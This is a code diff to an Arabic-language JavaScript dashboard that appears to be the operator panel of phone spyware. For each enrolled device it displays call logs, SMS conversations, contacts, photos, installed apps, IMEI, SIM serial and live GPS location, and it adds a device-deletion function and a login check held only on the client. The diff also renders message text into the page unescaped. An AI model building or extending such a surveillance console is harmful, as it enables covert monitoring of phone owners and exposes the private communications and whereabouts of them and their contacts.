@@ -1,5 +1,35 @@
+// التحقق من تسجيل الدخول
+if (sessionStorage.getItem('logged_in') !== 'true') {
+    window.location.href = 'login.html';
+}
+
 let currentDevice = null;
 let updateInterval = null;
+let allCalls = [];
+let allSMS = [];
+let allContacts = [];
+let currentChat = null;
+
+function logout() {
+    sessionStorage.removeItem('logged_in');
+    window.location.href = 'login.html';
+}
+
+// حذف الجهاز
+async function deleteDevice() {
+    if (!currentDevice) return;
+    if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
+    
+    try {
+        await fetch(`/api.php?action=delete_device&device=${currentDevice}`, { method: 'GET' });
+        alert('تم حذف الجهاز');
+        loadDevices();
+        currentDevice = null;
+        document.getElementById('deviceSelect').value = '';
+    } catch (e) {
+        alert('خطأ في الحذف');
+    }
+}
 
 // تحميل الأجهزة
 async function loadDevices() {
@@ -8,6 +38,7 @@ async function loadDevices() {
         const devices = await response.json();
         
         const select = document.getElementById('deviceSelect');
+        const currentValue = currentDevice;
         select.innerHTML = '<option value="">اختر الجهاز...</option>';
         
         devices.forEach(device => {
@@ -16,6 +47,10 @@ async function loadDevices() {
             option.textContent = device.id;
             select.appendChild(option);
         });
+        
+        if (currentValue) {
+            select.value = currentValue;
+        }
     } catch (e) {
         console.error('Devices error:', e);
     }
@@ -51,6 +86,7 @@ async function updateLiveData() {
             document.getElementById('locationStatus').textContent = 
                 `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}`;
             document.getElementById('locationStatus').className = 'value online';
+            showLocationDetails(data.location);
         }
         
         if (data.battery !== null && data.battery !== undefined) {
@@ -85,128 +121,316 @@ async function loadAllData() {
     await loadCalls();
     await loadSMS();
     await loadContacts();
+    await loadImages();
     await loadApps();
     await loadDeviceInfo();
 }
 
+// ============ المكالمات ============
 async function loadCalls() {
     try {
         const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=call_logs`);
-        const calls = await response.json();
-        const tbody = document.getElementById('callsTable');
-        tbody.innerHTML = '';
-        
-        if (!calls || calls.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;">لا توجد مكالمات</td></tr>';
-            return;
-        }
-        
-        calls.forEach(call => {
-            const row = document.createElement('tr');
-            row.innerHTML = `<td>${call.number || ''}</td><td>${formatDuration(call.duration)}</td><td>${getCallType(call.type)}</td><td>${formatDate(call.date)}</td>`;
-            tbody.appendChild(row);
-        });
+        allCalls = await response.json();
+        displayCalls(allCalls);
     } catch (e) {}
 }
 
+function displayCalls(calls) {
+    const tbody = document.querySelector('#callsTable tbody');
+    tbody.innerHTML = '';
+    
+    if (!calls || calls.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#888;">لا توجد مكالمات</td></tr>';
+        return;
+    }
+    
+    calls.forEach(call => {
+        const row = document.createElement('tr');
+        row.innerHTML = `
+            <td><span class="clickable" onclick="openChat('${call.number || ''}')">${call.number || 'غير معروف'}</span></td>
+            <td>${call.name || '—'}</td>
+            <td><span class="call-type type-${call.type}">${getCallType(call.type)}</span></td>
+            <td>${formatDuration(call.duration)}</td>
+            <td>${formatDate(call.date)}</td>
+        `;
+        tbody.appendChild(row);
+    });
+}
+
+function filterCalls() {
+    const search = document.getElementById('callSearch').value.toLowerCase();
+    const filtered = allCalls.filter(call => 
+        (call.number || '').toLowerCase().includes(search) ||
+        (call.name || '').toLowerCase().includes(search)
+    );
+    displayCalls(filtered);
+}
+
+// ============ الرسائل (محادثات) ============
 async function loadSMS() {
     try {
         const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=sms`);
-        const smsList = await response.json();
-        const tbody = document.getElementById('smsTable');
-        tbody.innerHTML = '';
-        
-        if (!smsList || smsList.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;">لا توجد رسائل</td></tr>';
-            return;
-        }
-        
-        smsList.forEach(sms => {
-            const row = document.createElement('tr');
-            row.innerHTML = `<td>${sms.address || ''}</td><td>${sms.body || ''}</td><td>${formatDate(sms.date)}</td><td>${sms.type == 1 ? 'وارد' : 'صادر'}</td>`;
-            tbody.appendChild(row);
-        });
+        allSMS = await response.json();
+        displayConversations();
     } catch (e) {}
 }
 
+function displayConversations() {
+    const conversationsDiv = document.getElementById('conversationsList');
+    const chatView = document.getElementById('chatView');
+    chatView.style.display = 'none';
+    conversationsDiv.style.display = 'block';
+    
+    conversationsDiv.innerHTML = '';
+    
+    if (!allSMS || allSMS.length === 0) {
+        conversationsDiv.innerHTML = '<p style="color:#888;">لا توجد رسائل</p>';
+        return;
+    }
+    
+    // تجميع المحادثات حسب الرقم
+    const conversations = {};
+    allSMS.forEach(sms => {
+        const number = sms.address || 'غير معروف';
+        if (!conversations[number]) {
+            conversations[number] = [];
+        }
+        conversations[number].push(sms);
+    });
+    
+    // عرض المحادثات
+    Object.keys(conversations).forEach(number => {
+        const messages = conversations[number];
+        const lastMessage = messages[messages.length - 1];
+        
+        const div = document.createElement('div');
+        div.className = 'conversation-item';
+        div.onclick = () => openChat(number);
+        div.innerHTML = `
+            <div class="conversation-avatar">💬</div>
+            <div class="conversation-info">
+                <div class="conversation-name">${number}</div>
+                <div class="conversation-preview">${lastMessage.body || ''}</div>
+            </div>
+            <div class="conversation-time">${formatDate(lastMessage.date)}</div>
+        `;
+        conversationsDiv.appendChild(div);
+    });
+}
+
+function openChat(number) {
+    currentChat = number;
+    document.getElementById('conversationsList').style.display = 'none';
+    document.getElementById('chatView').style.display = 'block';
+    document.getElementById('chatTitle').textContent = `💬 ${number}`;
+    
+    const messagesList = document.getElementById('messagesList');
+    messagesList.innerHTML = '';
+    
+    const chatMessages = allSMS.filter(sms => sms.address === number);
+    
+    chatMessages.forEach(sms => {
+        const div = document.createElement('div');
+        div.className = `message ${sms.type == 1 ? 'incoming' : 'outgoing'}`;
+        div.innerHTML = `
+            <div class="message-bubble">
+                <div class="message-text">${sms.body || ''}</div>
+                <div class="message-time">${formatDate(sms.date)}</div>
+            </div>
+        `;
+        messagesList.appendChild(div);
+    });
+    
+    messagesList.scrollTop = messagesList.scrollHeight;
+}
+
+function backToConversations() {
+    displayConversations();
+}
+
+// ============ جهات الاتصال ============
 async function loadContacts() {
     try {
         const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=contacts`);
-        const contacts = await response.json();
-        const tbody = document.getElementById('contactsTable');
-        tbody.innerHTML = '';
-        
-        if (!contacts || contacts.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="2" style="text-align:center;">لا توجد جهات</td></tr>';
-            return;
-        }
-        
-        contacts.forEach(contact => {
-            const row = document.createElement('tr');
-            row.innerHTML = `<td>${contact.name || ''}</td><td>${Array.isArray(contact.numbers) ? contact.numbers.join(', ') : ''}</td>`;
-            tbody.appendChild(row);
-        });
+        allContacts = await response.json();
+        displayContacts(allContacts);
     } catch (e) {}
 }
 
+function displayContacts(contacts) {
+    const tbody = document.querySelector('#contactsTable tbody');
+    tbody.innerHTML = '';
+    
+    if (!contacts || contacts.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:#888;">لا توجد جهات اتصال</td></tr>';
+        return;
+    }
+    
+    contacts.forEach(contact => {
+        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
+        const row = document.createElement('tr');
+        row.innerHTML = `
+            <td>${contact.name || 'بدون اسم'}</td>
+            <td>${numbers.join(', ')}</td>
+            <td>
+                ${numbers.map(n => `<button class="action-btn" onclick="openChat('${n}')">💬</button>`).join(' ')}
+            </td>
+        `;
+        tbody.appendChild(row);
+    });
+}
+
+function filterContacts() {
+    const search = document.getElementById('contactSearch').value.toLowerCase();
+    const filtered = allContacts.filter(contact => 
+        (contact.name || '').toLowerCase().includes(search) ||
+        (Array.isArray(contact.numbers) ? contact.numbers.join(' ') : '').toLowerCase().includes(search)
+    );
+    displayContacts(filtered);
+}
+
+// ============ الصور ============
+async function loadImages() {
+    try {
+        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=images`);
+        const images = await response.json();
+        
+        const grid = document.getElementById('imagesGrid');
+        grid.innerHTML = '';
+        
+        if (!images || images.length === 0) {
+            grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>';
+            return;
+        }
+        
+        images.forEach((image, index) => {
+            const div = document.createElement('div');
+            div.className = 'image-item';
+            
+            const img = document.createElement('img');
+            img.src = image.path || '';
+            img.className = 'thumb';
+            img.alt = image.name || `صورة ${index + 1}`;
+            img.onerror = function() {
+                this.style.display = 'none';
+                this.parentElement.innerHTML = '<div class="no-image">📷 صورة غير متاحة</div>';
+            };
+            img.onclick = () => window.open(img.src, '_blank');
+            
+            const name = document.createElement('div');
+            name.className = 'image-name';
+            name.textContent = image.name || `صورة ${index + 1}`;
+            
+            div.appendChild(img);
+            div.appendChild(name);
+            grid.appendChild(div);
+        });
+    } catch (e) {
+        console.error('Images error:', e);
+    }
+}
+
+// ============ التطبيقات ============
 async function loadApps() {
     try {
         const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=installed_apps`);
         const apps = await response.json();
-        const tbody = document.getElementById('appsTable');
+        
+        const tbody = document.querySelector('#appsTable tbody');
         tbody.innerHTML = '';
         
         if (!apps || apps.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;">لا توجد تطبيقات</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:#888;">لا توجد تطبيقات</td></tr>';
             return;
         }
         
         apps.forEach(app => {
             const row = document.createElement('tr');
-            row.innerHTML = `<td>${app.name || ''}</td><td>${app.package || ''}</td><td>${app.system_app ? 'نعم' : 'لا'}</td>`;
+            row.innerHTML = `
+                <td>${app.name || app.package || ''}</td>
+                <td>${app.package || ''}</td>
+                <td>${app.system_app ? 'نعم' : 'لا'}</td>
+            `;
             tbody.appendChild(row);
         });
     } catch (e) {}
 }
 
+// ============ معلومات الجهاز ============
 async function loadDeviceInfo() {
     try {
         const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=device_info`);
         const info = await response.json();
+        
         const div = document.getElementById('deviceInfo');
         
         if (!info || Object.keys(info).length === 0) {
-            div.innerHTML = '<p>لا توجد معلومات</p>';
+            div.innerHTML = '<p style="color:#888;">لا توجد معلومات</p>';
             return;
         }
         
         div.innerHTML = `
-            <table>
-                <tr><td>الموديل:</td><td>${info.model || ''}</td></tr>
-                <tr><td>العلامة:</td><td>${info.brand || ''}</td></tr>
-                <tr><td>النظام:</td><td>${info.os_version || ''}</td></tr>
-                <tr><td>IMEI:</td><td>${info.imei || ''}</td></tr>
-                <tr><td>الناقل:</td><td>${info.carrier || ''}</td></tr>
-            </table>
+            <div class="device-info-grid">
+                <div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div>
+                <div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div>
+                <div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div>
+                <div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div>
+                <div class="info-card"><span>الرقم التسلسلي:</span><strong>${info.sim_serial || '—'}</strong></div>
+                <div class="info-card"><span>الناقل:</span><strong>${info.carrier || '—'}</strong></div>
+                <div class="info-card"><span>الذاكرة:</span><strong>${formatBytes(info.total_ram)}</strong></div>
+                <div class="info-card"><span>المساحة الحرة:</span><strong>${formatBytes(info.free_storage)}</strong></div>
+            </div>
         `;
     } catch (e) {}
 }
 
+// ============ الموقع ============
+function showLocationDetails(location) {
+    const div = document.getElementById('locationDetails');
+    if (location && location.latitude) {
+        div.innerHTML = `
+            <p>خط العرض: ${location.latitude.toFixed(6)}</p>
+            <p>خط الطول: ${location.longitude.toFixed(6)}</p>
+            <p>الدقة: ${location.accuracy ? location.accuracy + ' متر' : '—'}</p>
+            <p>السرعة: ${location.speed ? location.speed + ' م/ث' : '—'}</p>
+        `;
+    }
+}
+
+// ============ دوال مساعدة ============
 function switchTab(tabName) {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
-    document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`).classList.add('active');
-    document.getElementById(`${tabName}Tab`).classList.add('active');
+    
+    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
+    if (tab) tab.classList.add('active');
+    
+    const pane = document.getElementById(`${tabName}Tab`);
+    if (pane) pane.classList.add('active');
 }
 
 function formatDuration(seconds) {
-    if (!seconds) return '0:00';
-    return `${Math.floor(seconds / 60)}:${(seconds % 60).toString().padStart(2, '0')}`;
+    if (!seconds || seconds < 0) return '0:00';
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${mins}:${secs.toString().padStart(2, '0')}`;
 }
 
 function formatDate(timestamp) {
     if (!timestamp) return '—';
-    return new Date(timestamp).toLocaleString('ar');
+    try {
+        return new Date(timestamp).toLocaleString('ar');
+    } catch (e) {
+        return '—';
+    }
+}
+
+function formatBytes(bytes) {
+    if (!bytes || bytes === 0) return '0 Bytes';
+    const k = 1024;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
 }
 
 function getCallType(type) {
